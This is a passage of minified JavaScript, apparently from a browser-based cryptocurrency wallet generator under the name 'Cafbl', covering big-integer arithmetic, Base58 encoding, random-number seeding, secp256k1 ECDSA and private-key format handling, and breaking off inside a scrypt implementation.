    if (0 > p) return r;
    for (p > t && (p = t), 0 < p && (r.rShiftTo(p, r), s.rShiftTo(p, s)); 0 < r.signum();) 0 < (t = r.getLowestSetBit()) && r.rShiftTo(t, r), 0 < (t = s.getLowestSetBit()) && s.rShiftTo(t, s), 0 <= r.compareTo(s) ? (r.subTo(s, r), r.rShiftTo(1, r)) : (s.subTo(r, s), s.rShiftTo(1, s));
    return 0 < p && s.lShiftTo(p, s), s
  }, h.prototype.isProbablePrime = function(e) {
    var t, r = this.abs();
    if (1 == r.t && r[0] <= F[F.length - 1]) {
      for (t = 0; t < F.length; ++t)
        if (r[0] == F[t]) return !0;
      return !1
    }
    if (r.isEven()) return !1;
    for (t = 1; t < F.length;) {
      for (var o = F[t], s = t + 1; s < F.length && T > o;) o *= F[s++];
      for (o = r.modInt(o); s > t;)
        if (0 == o % F[t++]) return !1
    }
    return r.millerRabin(e)
  }, h.prototype.square = function() {
    var e = s();
    return this.squareTo(e), e
  }, h.valueOf = p, h.prototype.toByteArrayUnsigned = function() {
    var e = this.abs().toByteArray();
    return e.length ? (0 == e[0] && (e = e.slice(1)), e.map(function(e) {
      return 0 > e ? e + 256 : e
    })) : e
  }, h.fromByteArrayUnsigned = function(e) {
    return e.length ? new h(128 & e[0] ? [0].concat(e) : e) : e.valueOf(0)
  }, h.prototype.toByteArraySigned = function() {
    var e = this.abs().toByteArrayUnsigned(),
      t = 0 > this.compareTo(h.ZERO);
    return t ? 128 & e[0] ? e.unshift(128) : e[0] |= 128 : 128 & e[0] && e.unshift(0), e
  }, h.fromByteArraySigned = function(e) {
    return 128 & e[0] ? (e[0] &= 127, h.fromByteArrayUnsigned(e).negate()) : h.fromByteArrayUnsigned(e)
  };
  var S = window.Classic = function(e) {
    this.m = e
  };
  S.prototype.convert = function(e) {
    return 0 > e.s || 0 <= e.compareTo(this.m) ? e.mod(this.m) : e
  }, S.prototype.revert = function(e) {
    return e
  }, S.prototype.reduce = function(e) {
    e.divRemTo(this.m, null, e)
  }, S.prototype.mulTo = function(e, t, o) {
    e.multiplyTo(t, o), this.reduce(o)
  }, S.prototype.sqrTo = function(e, t) {
    e.squareTo(t), this.reduce(t)
  };
  var A = window.Montgomery = function(e) {
    this.m = e, this.mp = e.invDigit(), this.mpl = 32767 & this.mp, this.mph = this.mp >> 15, this.um = (1 << e.DB - 15) - 1, this.mt2 = 2 * e.t
  };
  A.prototype.convert = function(e) {
    var t = s();
    return e.abs().dlShiftTo(this.m.t, t), t.divRemTo(this.m, null, t), 0 > e.s && 0 < t.compareTo(h.ZERO) && this.m.subTo(t, t), t
  }, A.prototype.revert = function(e) {
    var t = s();
    return e.copyTo(t), this.reduce(t), t
  }, A.prototype.reduce = function(e) {
    for (; e.t <= this.mt2;) e[e.t++] = 0;
    for (var t = 0; t < this.m.t; ++t) {
      var o = 32767 & e[t],
        r = o * this.mpl + ((o * this.mph + (e[t] >> 15) * this.mpl & this.um) << 15) & e.DM;
      for (o = t + this.m.t, e[o] += this.m.am(0, r, e, t, 0, this.m.t); e[o] >= e.DV;) e[o] -= e.DV, e[++o]++
    }
    e.clamp(), e.drShiftTo(this.m.t, e), 0 <= e.compareTo(this.m) && e.subTo(this.m, e)
  }, A.prototype.mulTo = function(e, t, o) {
    e.multiplyTo(t, o), this.reduce(o)
  }, A.prototype.sqrTo = function(e, t) {
    e.squareTo(t), this.reduce(t)
  };
  var v = window.NullExp = function() {};
  v.prototype.convert = function(e) {
    return e
  }, v.prototype.revert = function(e) {
    return e
  }, v.prototype.mulTo = function(e, t, o) {
    e.multiplyTo(t, o)
  }, v.prototype.sqrTo = function(e, t) {
    e.squareTo(t)
  };
  var E = window.Barrett = function(e) {
    this.r2 = s(), this.q3 = s(), h.ONE.dlShiftTo(2 * e.t, this.r2), this.mu = this.r2.divide(e), this.m = e
  };
  E.prototype.convert = function(e) {
    if (0 > e.s || e.t > 2 * this.m.t) return e.mod(this.m);
    if (0 > e.compareTo(this.m)) return e;
    var t = s();
    return e.copyTo(t), this.reduce(t), t
  }, E.prototype.revert = function(e) {
    return e
  }, E.prototype.reduce = function(e) {
    for (e.drShiftTo(this.m.t - 1, this.r2), e.t > this.m.t + 1 && (e.t = this.m.t + 1, e.clamp()), this.mu.multiplyUpperTo(this.r2, this.m.t + 1, this.q3), this.m.multiplyLowerTo(this.q3, this.m.t + 1, this.r2); 0 > e.compareTo(this.r2);) e.dAddOffset(1, this.m.t + 1);
    for (e.subTo(this.r2, e); 0 <= e.compareTo(this.m);) e.subTo(this.m, e)
  }, E.prototype.mulTo = function(e, t, o) {
    e.multiplyTo(t, o), this.reduce(o)
  }, E.prototype.sqrTo = function(e, t) {
    e.squareTo(t), this.reduce(t)
  }
}(),
function() {}("object" == typeof module ? module.exports : window.Cafbl = {}),
function(e) {
  e.Base58 = {
    alphabet: "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz",
    validRegex: /^[1-9A-HJ-NP-Za-km-z]+$/,
    base: BigInteger.valueOf(58),
    encode: function(e) {
      for (var o, r = BigInteger.fromByteArrayUnsigned(e), s = []; 0 <= r.compareTo(t.base);) o = r.mod(t.base), s.unshift(t.alphabet[o.intValue()]), r = r.subtract(o).divide(t.base);
      s.unshift(t.alphabet[r.intValue()]);
      for (var n = 0; n < e.length && 0 == e[n]; n++) s.unshift(t.alphabet[0]);
      return s.join("")
    },
    decode: function(e) {
      for (var o, r = BigInteger.valueOf(0), s = 0, n = e.length - 1; 0 <= n; n--) {
        if (o = t.alphabet.indexOf(e[n]), 0 > o) throw "Invalid character";
        r = r.add(BigInteger.valueOf(o).multiply(t.base.pow(e.length - 1 - n))), "1" == e[n] ? s++ : s = 0
      }
      for (var p = r.toByteArrayUnsigned(); 0 < s--;) p.unshift(0);
      return p
    }
  };
  var t = e.Base58
}("undefined" == typeof Cafbl ? module.exports : Cafbl),
function() {
  var e = window.SecureRandom = function() {};
  if (e.state, e.pool, e.pptr, e.poolCopyOnInit, e.poolSize = 256, e.prototype.nextBytes = function(t) {
      var o;
      if (window.crypto && window.crypto.getRandomValues && window.Uint8Array) try {
        var r = new Uint8Array(t.length);
        for (window.crypto.getRandomValues(r), o = 0; o < t.length; ++o) t[o] = e.getByte() ^ r[o];
        return
      } catch (e) {
        alert(e)
      }
      for (o = 0; o < t.length; ++o) t[o] = e.getByte()
    }, e.seedTime = function() {
      e.seedInt(new Date().getTime())
    }, e.getByte = function() {
      if (null == e.state) {
        for (e.seedTime(), e.state = e.ArcFour(), e.state.init(e.pool), e.poolCopyOnInit = [], e.pptr = 0; e.pptr < e.pool.length; ++e.pptr) e.poolCopyOnInit[e.pptr] = e.pool[e.pptr];
        e.pptr = 0
      }
      return e.state.next()
    }, e.seedInt = function(t) {
      e.seedInt8(t), e.seedInt8(t >> 8), e.seedInt8(t >> 16), e.seedInt8(t >> 24)
    }, e.seedInt16 = function(t) {
      e.seedInt8(t), e.seedInt8(t >> 8)
    }, e.seedInt8 = function(t) {
      e.pool[e.pptr++] ^= 255 & t, e.pptr >= e.poolSize && (e.pptr -= e.poolSize)
    }, e.ArcFour = function() {
      function e() {
        this.i = 0, this.j = 0, this.S = []
      }

      function t(e) {
        var o, r, s;
        for (o = 0; 256 > o; ++o) this.S[o] = o;
        for (r = 0, o = 0; 256 > o; ++o) r = 255 & r + this.S[o] + e[o % e.length], s = this.S[o], this.S[o] = this.S[r], this.S[r] = s;
        this.i = 0, this.j = 0
      }

      function o() {
        var e;
        return this.i = 255 & this.i + 1, this.j = 255 & this.j + this.S[this.i], e = this.S[this.i], this.S[this.i] = this.S[this.j], this.S[this.j] = e, this.S[255 & e + this.S[this.i]]
      }
      return e.prototype.init = t, e.prototype.next = o, new e
    }, null == e.pool) {
    e.pool = [], e.pptr = 0;
    var o;
    if (window.crypto && window.crypto.getRandomValues && window.Uint8Array) try {
      var r = new Uint8Array(e.poolSize);
      for (window.crypto.getRandomValues(r), o = 0; o < e.poolSize; ++o) e.pool[e.pptr++] = r[o]
    } catch (e) {
      alert(e)
    }
    for (; e.pptr < e.poolSize;) o = Math.floor(65536 * Math.random()), e.pool[e.pptr++] = o >>> 8, e.pool[e.pptr++] = 255 & o;
    e.pptr = Math.floor(e.poolSize * Math.random()), e.seedTime();
    var s = "";
    s += window.screen.height * window.screen.width * window.screen.colorDepth, s += window.screen.availHeight * window.screen.availWidth * window.screen.pixelDepth;
    var n = new Date,
      p = n.getTimezoneOffset();
    s += p, s += navigator.userAgent;
    for (var a = "", d = 0; d < navigator.plugins.length; d++) a += navigator.plugins[d].name + " " + navigator.plugins[d].filename + " " + navigator.plugins[d].description + " " + navigator.plugins[d].version + ", ";
    for (var l = "", d = 0; d < navigator.mimeTypes.length; d++) l += navigator.mimeTypes[d].description + " " + navigator.mimeTypes[d].type + " " + navigator.mimeTypes[d].suffixes + ", ";
    s += a + l, s += navigator.cookieEnabled + typeof sessionStorage + typeof localStorage, s += navigator.language, s += window.history.length, s += window.location;
    for (var u = Crypto.SHA256(s, {
        asBytes: !0
      }), d = 0; d < u.length; d++) e.seedInt8(u[d])
  }
}(), Cafbl.Address = function(e) {
    "string" == typeof e && (e = Cafbl.Address.decodeString(e)), this.hash = e, this.version = Cafbl.Address.networkVersion
  }, Cafbl.Address.networkVersion = 0, Cafbl.Address.prototype.toString = function() {
    var e = this.hash.slice(0);
    e.unshift(this.version);
    var t = Crypto.SHA256(Crypto.SHA256(e, {
        asBytes: !0
      }), {
        asBytes: !0
      }),
      o = e.concat(t.slice(0, 4));
    return Cafbl.Base58.encode(o)
  }, Cafbl.Address.prototype.getHashBase64 = function() {
    return Crypto.util.bytesToBase64(this.hash)
  }, Cafbl.Address.decodeString = function(e) {
    var t = Cafbl.Base58.decode(e),
      o = t.slice(0, 21),
      i = Crypto.SHA256(Crypto.SHA256(o, {
        asBytes: !0
      }), {
        asBytes: !0
      });
    if (i[0] != t[21] || i[1] != t[22] || i[2] != t[23] || i[3] != t[24]) throw "Checksum validation failed!";
    var r = o.shift();
    if (0 != r) throw "Version " + r + " not supported!";
    return o
  }, Cafbl.ECDSA = function() {
    function t(e, t, o, r) {
      for (var s = Math.max(t.bitLength(), r.bitLength()), n = e.add2D(o), p = e.curve.getInfinity(), a = s - 1; 0 <= a; --a) p = p.twice2D(), p.z = BigInteger.ONE, t.testBit(a) ? p = p.add2D(r.testBit(a) ? n : e) : r.testBit(a) && (p = p.add2D(o));
      return p
    }
    var l = EllipticCurve.getSECCurveByName("secp256k1"),
      e = new SecureRandom,
      o = null,
      u = {
        getBigRandom: function(t) {
          return new BigInteger(t.bitLength(), e).mod(t.subtract(BigInteger.ONE)).add(BigInteger.ONE)
        },
        sign: function(t, o) {
          var i = l.getN(),
            n = BigInteger.fromByteArrayUnsigned(t);
          do var e = u.getBigRandom(i),
            p = l.getG(),
            a = p.multiply(e),
            d = a.getX().toBigInteger().mod(i); while (0 >= d.compareTo(BigInteger.ZERO));
          var r = e.modInverse(i).multiply(n.add(o.multiply(d))).mod(i);
          return u.serializeSig(d, r)
        },
        verify: function(t, o, i) {
          var n, p;
          if (Cafbl.Util.isArray(o)) {
            var a = u.parseSig(o);
            n = a.r, p = a.s
          } else {
            if ("object" != typeof o || !o.r || !o.s) throw "Invalid value for signature";
            n = o.r, p = o.s
          }
          var d;
          if (i instanceof ec.PointFp) d = i;
          else {
            if (!Cafbl.Util.isArray(i)) throw "Invalid format for pubkey value, must be byte array or ec.PointFp";
            d = EllipticCurve.PointFp.decodeFrom(l.getCurve(), i)
          }
          var y = BigInteger.fromByteArrayUnsigned(t);
          return u.verifyRaw(y, n, p, d)
        },
        verifyRaw: function(t, e, i, r) {
          var o = l.getN(),
            s = l.getG();
          if (0 > e.compareTo(BigInteger.ONE) || 0 <= e.compareTo(o)) return !1;
          if (0 > i.compareTo(BigInteger.ONE) || 0 <= i.compareTo(o)) return !1;
          var n = i.modInverse(o),
            p = t.multiply(n).mod(o),
            a = e.multiply(n).mod(o),
            d = s.multiply(p).add(r.multiply(a)),
            u = d.getX().toBigInteger().mod(o);
          return u.equals(e)
        },
        serializeSig: function(e, t) {
          var i = e.toByteArraySigned(),
            o = t.toByteArraySigned(),
            r = [];
          return r.push(2), r.push(i.length), r = r.concat(i), r.push(2), r.push(o.length), r = r.concat(o), r.unshift(r.length), r.unshift(48), r
        },
        parseSig: function(e) {
          var t;
          if (48 != e[0]) throw new Error("Signature not a valid DERSequence");
          if (t = 2, 2 != e[t]) throw new Error("First element in signature must be a DERInteger");
          var o = e.slice(t + 2, t + 2 + e[t + 1]);
          if (t += 2 + e[t + 1], 2 != e[t]) throw new Error("Second element in signature must be a DERInteger");
          var i = e.slice(t + 2, t + 2 + e[t + 1]);
          t += 2 + e[t + 1];
          var n = BigInteger.fromByteArrayUnsigned(o),
            r = BigInteger.fromByteArrayUnsigned(i);
          return {
            r: n,
            s: r
          }
        },
        parseSigCompact: function(e) {
          if (65 !== e.length) throw "Signature has the wrong length";
          var t = e[0] - 27;
          if (0 > t || 7 < t) throw "Invalid signature type";
          var o = l.getN(),
            i = BigInteger.fromByteArrayUnsigned(e.slice(1, 33)).mod(o),
            r = BigInteger.fromByteArrayUnsigned(e.slice(33, 65)).mod(o);
          return {
            r: i,
            s: r,
            i: t
          }
        },
        recoverPubKey: function(d, r, s, y) {
          y = 3 & y;
          var c = 1 & y,
            m = y >> 1,
            g = l.getN(),
            n = l.getG(),
            f = l.getCurve(),
            h = f.getQ(),
            p = f.getA().toBigInteger(),
            a = f.getB().toBigInteger();
          o || (o = h.add(BigInteger.ONE).divide(BigInteger.valueOf(4)));
          var b = m ? d.add(g) : d,
            B = b.multiply(b).multiply(b).add(p.multiply(b)).add(a).mod(h),
            F = B.modPow(o, h),
            T = (F.isEven() ? y % 2 : (y + 1) % 2, (F.isEven() ? !c : c) ? F : h.subtract(F)),
            v = new EllipticCurve.PointFp(f, f.fromBigInteger(b), f.fromBigInteger(T));
          v.validate();
          var S = BigInteger.fromByteArrayUnsigned(s),
            e = BigInteger.ZERO.subtract(S).mod(g),
            C = d.modInverse(g),
            A = t(v, r, n, e).multiply(C);
          if (A.validate(), !u.verifyRaw(S, d, r, A)) throw "Pubkey recovery unsuccessful";
          var E = new Cafbl.ECKey;
          return E.pub = A, E
        },
        calcPubkeyRecoveryParam: function(e, t, o, r) {
          for (var s = 0; 4 > s; s++) try {
            var n = Cafbl.ECDSA.recoverPubKey(t, o, r, s);
            if (n.getCafblAddress().toString() == e) return s
          } catch (e) {}
          throw "Unable to find valid recovery factor"
        }
      };
    return u
  }(), Cafbl.KeyPool = function() {
    return new function() {
      return this.keyArray = [], this.push = function(e) {
        if (null != e && null != e.priv) {
          var t = !0;
          for (var o in this.keyArray) {
            var i = this.keyArray[o];
            if (null != i && null != i.priv && e.getCafblAddress() == i.getCafblAddress()) {
              t = !1;
              break
            }
          }
          t && this.keyArray.push(e)
        }
      }, this.reset = function() {
        this.keyArray = []
      }, this.getArray = function() {
        return this.keyArray.slice(0)
      }, this.setArray = function(e) {
        this.keyArray = e
      }, this.length = function() {
        return this.keyArray.length
      }, this.toString = function() {
        var e = "# = " + this.length() + "\n",
          t = this.getArray();
        for (var i in t) {
          var r = t[i];
          Cafbl.Util.hasMethods(r, "getCafblAddress", "toString") && null != r && (e += "\"" + r.getCafblAddress() + "\", \"" + r.toString("wif") + "\"\n")
        }
        return e
      }, this
    }
  }(), Cafbl.Bip38Key = function() {
    var e = function(e, t) {
      this.address = e, this.priv = t
    };
    return e.prototype.getCafblAddress = function() {
      return this.address
    }, e.prototype.toString = function() {
      return this.priv
    }, e
  }(), Cafbl.ECKey = function() {
    var e = Cafbl.ECDSA,
      t = Cafbl.KeyPool,
      i = EllipticCurve.getSECCurveByName("secp256k1"),
      r = function(o) {
        if (!o) {
          var s = i.getN();
          this.priv = e.getBigRandom(s)
        } else if (o instanceof BigInteger) this.priv = o;
        else if (Cafbl.Util.isArray(o)) this.priv = BigInteger.fromByteArrayUnsigned(o);
        else if ("string" == typeof o) {
          var n = null;
          try {
            r.isWalletImportFormat(o) ? n = r.decodeWalletImportFormat(o) : r.isCompressedWalletImportFormat(o) ? (n = r.decodeCompressedWalletImportFormat(o), this.compressed = !0) : r.isMiniFormat(o) ? n = Crypto.SHA256(o, {
              asBytes: !0
            }) : r.isHexFormat(o) ? n = Crypto.util.hexToBytes(o) : r.isBase64Format(o) && (n = Crypto.util.base64ToBytes(o))
          } catch (e) {
            this.setError(e)
          }
          this.priv = r.isBase6Format(o) ? new BigInteger(o, 6) : null == n || 32 != n.length ? null : BigInteger.fromByteArrayUnsigned(n)
        }
        this.compressed = null == this.compressed ? !!r.compressByDefault : this.compressed;
        try {
          null != this.priv && 0 == BigInteger.ZERO.compareTo(this.priv) && this.setError("Error: BigInteger equal to zero.");
          var p = Crypto.util.hexToBytes("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364140"),
            a = BigInteger.fromByteArrayUnsigned(p);
          null != this.priv && 0 > a.compareTo(this.priv) && this.setError("Error: BigInteger outside of curve range."), null != this.priv && t.push(this)
        } catch (e) {
          this.setError(e)
        }
      };
    return r.privateKeyPrefix = 128, r.compressByDefault = !1, r.prototype.setError = function(e) {
      return this.error = e, this.priv = null, this
    }, r.prototype.setCompressed = function(e) {
      return this.compressed = !!e, this.pubPoint && (this.pubPoint.compressed = this.compressed), this
    }, r.prototype.getPub = function() {
      return this.compressed ? this.pubComp ? this.pubComp : this.pubComp = this.getPubPoint().getEncoded(1) : this.pubUncomp ? this.pubUncomp : this.pubUncomp = this.getPubPoint().getEncoded(0)
    }, r.prototype.getPubPoint = function() {
      return this.pubPoint || (this.pubPoint = i.getG().multiply(this.priv), this.pubPoint.compressed = this.compressed), this.pubPoint
    }, r.prototype.getPubKeyHex = function() {
      return this.compressed ? this.pubKeyHexComp ? this.pubKeyHexComp : this.pubKeyHexComp = Crypto.util.bytesToHex(this.getPub()).toString().toUpperCase() : this.pubKeyHexUncomp ? this.pubKeyHexUncomp : this.pubKeyHexUncomp = Crypto.util.bytesToHex(this.getPub()).toString().toUpperCase()
    }, r.prototype.getPubKeyHash = function() {
      return this.compressed ? this.pubKeyHashComp ? this.pubKeyHashComp : this.pubKeyHashComp = Cafbl.Util.sha256ripe160(this.getPub()) : this.pubKeyHashUncomp ? this.pubKeyHashUncomp : this.pubKeyHashUncomp = Cafbl.Util.sha256ripe160(this.getPub())
    }, r.prototype.getCafblAddress = function() {
      var e = this.getPubKeyHash(),
        t = new Cafbl.Address(e);
      return t.toString()
    }, r.prototype.setPub = function(e) {
      Cafbl.Util.isArray(e) && (e = Crypto.util.bytesToHex(e).toString().toUpperCase());
      var t = i.getCurve().decodePointHex(e);
      return this.setCompressed(t.compressed), this.pubPoint = t, this
    }, r.prototype.getCafblWalletImportFormat = function() {
      var e = this.getCafblPrivateKeyByteArray();
      if (null == e) return "";
      e.unshift(r.privateKeyPrefix), this.compressed && e.push(1);
      var t = Crypto.SHA256(Crypto.SHA256(e, {
        asBytes: !0
      }), {
        asBytes: !0
      });
      e = e.concat(t.slice(0, 4));
      var i = Cafbl.Base58.encode(e);
      return i
    }, r.prototype.getCafblHexFormat = function() {
      return Crypto.util.bytesToHex(this.getCafblPrivateKeyByteArray()).toString().toUpperCase()
    }, r.prototype.getCafblBase64Format = function() {
      return Crypto.util.bytesToBase64(this.getCafblPrivateKeyByteArray())
    }, r.prototype.getCafblPrivateKeyByteArray = function() {
      if (null == this.priv) return null;
      for (var e = this.priv.toByteArrayUnsigned(); 32 > e.length;) e.unshift(0);
      return e
    }, r.prototype.toString = function(e) {
      return e = e || "", "base64" == e.toString().toLowerCase() || "b64" == e.toString().toLowerCase() ? this.getCafblBase64Format() : "wif" == e.toString().toLowerCase() ? this.getCafblWalletImportFormat() : this.getCafblHexFormat()
    }, r.prototype.sign = function(t) {
      return e.sign(t, this.priv)
    }, r.prototype.verify = function(t, o) {
      return e.verify(t, o, this.getPub())
    }, r.decodeWalletImportFormat = function(e) {
      var t = Cafbl.Base58.decode(e),
        o = t.slice(0, 33),
        i = Crypto.SHA256(Crypto.SHA256(o, {
          asBytes: !0
        }), {
          asBytes: !0
        });
      if (i[0] != t[33] || i[1] != t[34] || i[2] != t[35] || i[3] != t[36]) throw "Checksum validation failed!";
      var s = o.shift();
      if (s != r.privateKeyPrefix) throw "Version " + s + " not supported!";
      return o
    }, r.decodeCompressedWalletImportFormat = function(e) {
      var t = Cafbl.Base58.decode(e),
        o = t.slice(0, 34),
        i = Crypto.SHA256(Crypto.SHA256(o, {
          asBytes: !0
        }), {
          asBytes: !0
        });
      if (i[0] != t[34] || i[1] != t[35] || i[2] != t[36] || i[3] != t[37]) throw "Checksum validation failed!";
      var s = o.shift();
      if (s != r.privateKeyPrefix) throw "Version " + s + " not supported!";
      return o.pop(), o
    }, r.isHexFormat = function(e) {
      return e = e.toString(), /^[A-Fa-f0-9]{64}$/.test(e)
    }, r.isWalletImportFormat = function(e) {
      return e = e.toString(), 128 == r.privateKeyPrefix ? /^5[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{50}$/.test(e) : /^9[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{50}$/.test(e)
    }, r.isCompressedWalletImportFormat = function(e) {
      return e = e.toString(), 128 == r.privateKeyPrefix ? /^[LK][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{51}$/.test(e) : /^c[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{51}$/.test(e)
    }, r.isBase64Format = function(e) {
      return e = e.toString(), /^[ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789=+\/]{44}$/.test(e)
    }, r.isBase6Format = function(e) {
      return e = e.toString(), /^[012345]{99}$/.test(e)
    }, r.isMiniFormat = function(e) {
      e = e.toString();
      var t = /^S[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{21}$/.test(e),
        i = /^S[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{25}$/.test(e),
        r = /^S[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{29}$/.test(e),
        s = Crypto.SHA256(e + "?", {
          asBytes: !0
        });
      return (0 === s[0] || 1 === s[0]) && (t || i || r)
    }, r
  }(), Cafbl.Util = {
    isArray: Array.isArray || function(e) {
      return "[object Array]" === Object.prototype.toString.call(e)
    },
    makeFilledArray: function(e, t) {
      for (var o = [], r = 0; e > r;) o[r++] = t;
      return o
    },
    numToVarInt: function(e) {
      return 253 > e ? [e] : 65536 >= e ? [253, e >>> 8, 255 & e] : 1 >= e ? [254].concat(Crypto.util.wordsToBytes([e])) : [255].concat(Crypto.util.wordsToBytes([e >>> 32, e]))
    },
    valueToBigInt: function(e) {
      return e instanceof BigInteger ? e : BigInteger.fromByteArrayUnsigned(e)
    },
    formatValue: function(e) {
      for (var t = this.valueToBigInt(e).toString(), o = 8 < t.length ? t.substr(0, t.length - 8) : "0", i = 8 < t.length ? t.substr(t.length - 8) : t; 8 > i.length;) i = "0" + i;
      for (i = i.replace(/0*$/, ""); 2 > i.length;) i += "0";
      return o + "." + i
    },
    parseValue: function(e) {
      for (var t = e.split("."), o = t[0], i = t[1] || "0"; 8 > i.length;) i += "0";
      i = i.replace(/^0+/g, "");
      var r = BigInteger.valueOf(parseInt(o));
      return r = r.multiply(BigInteger.valueOf(1e8)), r = r.add(BigInteger.valueOf(parseInt(i)))
    },
    sha256ripe160: function(e) {
      return Crypto.RIPEMD160(Crypto.SHA256(e, {
        asBytes: !0
      }), {
        asBytes: !0
      })
    },
    dsha256: function(e) {
      return Crypto.SHA256(Crypto.SHA256(e, {
        asBytes: !0
      }), {
        asBytes: !0
      })
    },
    hasMethods: function(e) {
      for (var t, o = 1; t = arguments[o++];)
        if ("function" != typeof e[t]) return !1;
      return !0
    }
  },
  function() {
    var e = null;
    window.Crypto_scrypt = function(t, o, s, n, r, p, a) {
      function l() {
        function e(e, s, n, r, p, a) {
          var d, u = 128 * n;
          for (m(e, s, a, 0, u), d = 0; r > d; d++) m(a, 0, p, d * u, u), t(a, 0, u, n);
          for (d = 0; r > d; d++) {
            var y = o(a, 0, n) & r - 1;
            l(p, y * u, a, 0, u), t(a, 0, u, n)
          }
          m(a, 0, e, s, u)
        }

        function t(e, t, o, s) {
          var r, n = [];
          for (m(e, t + 64 * (2 * s - 1), n, 0, 64), r = 0; 2 * s > r; r++) l(e, 64 * r, n, 0, 64), a(n), m(n, 0, e, o + 64 * r, 64);
          for (r = 0; s > r; r++) m(e, o + 64 * (2 * r), e, t + 64 * r, 64);
          for (r = 0; s > r; r++) m(e, o + 64 * (2 * r + 1), e, t + 64 * (r + s), 64)
        }

        function p(e, t) {
          return e << t | e >>> 32 - t
        }

        function a(e) {
          var t, r = Array(32),
            o = Array(32);
          for (t = 0; 16 > t; t++) r[t] = (255 & e[4 * t + 0]) << 0, r[t] |= (255 & e[4 * t + 1]) << 8, r[t] |= (255 & e[4 * t + 2]) << 16, r[t] |= (255 & e[4 * t + 3]) << 24;
          for (d(r, 0, o, 0, 16), t = 8; 0 < t; t -= 2) o[4] ^= p(o[0] + o[12], 7), o[8] ^= p(o[4] + o[0], 9), o[12] ^= p(o[8] + o[4], 13), o[0] ^= p(o[12] + o[8], 18), o[9] ^= p(o[5] + o[1], 7), o[13] ^= p(o[9] + o[5], 9), o[1] ^= p(o[13] + o[9], 13), o[5] ^= p(o[1] + o[13], 18), o[14] ^= p(o[10] + o[6], 7), o[2] ^= p(o[14] + o[10], 9), o[6] ^= p(o[2] + o[14], 13), o[10] ^= p(o[6] + o[2], 18), o[3] ^= p(o[15] + o[11], 7), o[7] ^= p(o[3] + o[15], 9), o[11] ^= p(o[7] + o[3], 13), o[15] ^= p(o[11] + o[7], 18), o[1] ^= p(o[0] + o[3], 7), o[2] ^= p(o[1] + o[0], 9), o[3] ^= p(o[2] + o[1], 13), o[0] ^= p(o[3] + o[2], 18), o[6] ^= p(o[5] + o[4], 7), o[7] ^= p(o[6] + o[5], 9), o[4] ^= p(o[7] + o[6], 13), o[5] ^= p(o[4] + o[7], 18), o[11] ^= p(o[10] + o[9], 7), o[8] ^= p(o[11] + o[10], 9), o[9] ^= p(o[8] + o[11], 13), o[10] ^= p(o[9] + o[8], 18), o[12] ^= p(o[15] + o[14], 7), o[13] ^= p(o[12] + o[15], 9), o[14] ^= p(o[13] + o[12], 13), o[15] ^= p(o[14] + o[13], 18);
          for (t = 0; 16 > t; ++t) r[t] = o[t] + r[t];
          for (t = 0; 16 > t; t++) {
            var s = 4 * t;
            e[s + 0] = 255 & r[t] >> 0, e[s + 1] = 255 & r[t] >> 8, e[s + 2] = 255 & r[t] >> 16, e[s + 3] = 255 & r[t] >> 24
          }
        }

        function l(e, t, o, r, s) {
          for (var n = s >> 6; n--;) o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++], o[r++] ^= e[t++]
        }

        function o(e, t, i) {
          var r;
          return t += 64 * (2 * i - 1), r = (255 & e[t + 0]) << 0, r |= (255 & e[t + 1]) << 8, r |= (255 & e[t + 2]) << 16, r |= (255 & e[t + 3]) << 24
        }

        function d(e, t, o, i, r) {
          for (; r--;) o[i++] = e[t++]
        }

        function m(e, t, o, r, s) {
